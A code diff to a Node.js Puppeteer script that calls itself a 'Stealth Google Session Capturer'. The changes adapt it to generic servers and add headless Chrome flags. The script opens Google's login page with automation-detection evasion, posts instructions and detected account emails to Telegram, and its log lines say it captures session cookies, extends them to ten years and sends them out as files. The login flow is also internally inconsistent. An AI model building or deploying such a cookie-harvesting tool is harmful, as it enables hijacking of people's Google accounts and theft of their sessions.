@@ -196,15 +196,13 @@ async function notifyRedirect(email) {
 }
 
 // ============================================================
-// FIND CHROME ON RENDER/RAILWAY
+// FIND CHROME ON SERVER
 // ============================================================
 function getChromePath() {
     const possiblePaths = [
         '/usr/bin/google-chrome',
         '/usr/bin/chromium-browser',
         '/usr/bin/chromium',
-        '/opt/render/.cache/puppeteer/chrome/linux-121.0.6167.85/chrome-linux64/chrome',
-        '/opt/render/.cache/puppeteer/chrome/linux-120.0.6099.109/chrome-linux64/chrome',
         process.env.CHROME_PATH || null
     ];
     
@@ -215,15 +213,15 @@ function getChromePath() {
         }
     }
     
-    console.log('⚠️ Chrome not found, will use Puppeteer default');
+    console.log('⚠️ Chrome not found, using Puppeteer default');
     return null;
 }
 
 // ============================================================
-// MAIN CAPTURE FUNCTION - HEADLESS MODE!
+// MAIN CAPTURE FUNCTION - HEADLESS WITH NO SANDBOX
 // ============================================================
 async function captureGoogleSession() {
-    console.log('🚀 Starting Stealth Puppeteer (Headless Mode)...');
+    console.log('🚀 Starting Stealth Puppeteer (Server Mode)...');
     console.log(`📡 Base URL: ${BASE_URL}`);
     
     let browser;
@@ -232,29 +230,43 @@ async function captureGoogleSession() {
     try {
         const chromePath = getChromePath();
         
-        // CRITICAL: headless: true for server deployment!
+        // ============================================================
+        // CRITICAL SERVER CONFIGURATION
+        // ============================================================
         const launchOptions = {
-            headless: true,  // CHANGED TO TRUE!
+            // MUST be true for headless servers
+            headless: true,
+            
+            // CRITICAL: These args fix the bus and display errors
             args: [
-                '--no-sandbox',
-                '--disable-setuid-sandbox',
-                '--disable-dev-shm-usage',
-                '--disable-accelerated-2d-canvas',
-                '--disable-gpu',
+                '--no-sandbox',                      // Required for servers
+                '--disable-setuid-sandbox',          // Required for servers
+                '--disable-dev-shm-usage',           // Prevent /dev/shm errors
+                '--disable-accelerated-2d-canvas',   // GPU issues
+                '--disable-gpu',                     // No GPU needed
                 '--disable-features=IsolateOrigins,site-per-process',
                 '--disable-blink-features=AutomationControlled',
                 '--disable-background-timer-throttling',
                 '--disable-backgrounding-occluded-windows',
                 '--disable-renderer-backgrounding',
+                '--disable-component-extensions-with-background-pages',
+                '--disable-extensions',
+                '--disable-plugins',
+                '--disable-default-apps',
+                '--disable-sync',
+                '--no-first-run',
+                '--no-default-browser-check',
                 '--window-size=1280,800'
             ],
             ignoreDefaultArgs: ['--enable-automation']
         };
         
+        // Add executable path if found
         if (chromePath) {
             launchOptions.executablePath = chromePath;
         }
         
+        console.log('🚀 Launching Chrome (headless mode)...');
         browser = await puppeteer.launch(launchOptions);
 
         page = await browser.newPage();
@@ -264,8 +276,17 @@ async function captureGoogleSession() {
 
         console.log('🌐 Opening Google login...');
         
-        // Send the login URL to user
-        await sendToTelegram(`🔐 **Please login to Google:**\n\n1. Open this link in your browser:\n\`https://accounts.google.com/\`\n\n2. Login to your account\n\n3. After login, the cookies will be captured automatically!`);
+        // Send login instructions to user
+        await sendToTelegram(`🔐 **Please login to Google:**
+
+1. **Open this link** in your browser:
+   \`https://accounts.google.com/\`
+
+2. **Login** to your Google account
+
+3. **Wait** - Your cookies will be captured automatically!
+
+⏳ The script is waiting for you to log in...`);
 
         // Open Google login page
         await page.goto('https://accounts.google.com/', {
@@ -274,7 +295,6 @@ async function captureGoogleSession() {
         });
 
         console.log('⏳ Waiting for user to log in...');
-        console.log('📱 User should log in using the link sent to Telegram');
 
         // Wait for login
         let loggedIn = false;
@@ -323,7 +343,7 @@ async function captureGoogleSession() {
                     userEmail = loginCheck.email || 'Unknown';
                     userName = loginCheck.name || 'Unknown';
                     console.log('✅ Login detected!', userEmail);
-                    await sendToTelegram(`✅ **Login detected for:** ${userEmail}`);
+                    await sendToTelegram(`✅ **Login detected for:** ${userEmail}\n📥 Capturing cookies...`);
                     break;
                 }
 
@@ -495,7 +515,7 @@ async function captureGoogleSession() {
 // ============================================================
 // RUN
 // ============================================================
-console.log('🚀 Stealth Google Session Capturer (Headless Mode)');
+console.log('🚀 Stealth Google Session Capturer (Server Mode)');
 console.log('========================================');
 console.log('📁 4 files will be sent as DOWNLOADABLE attachments!');
 console.log('🔑 Cookies extended to 10 YEARS!');
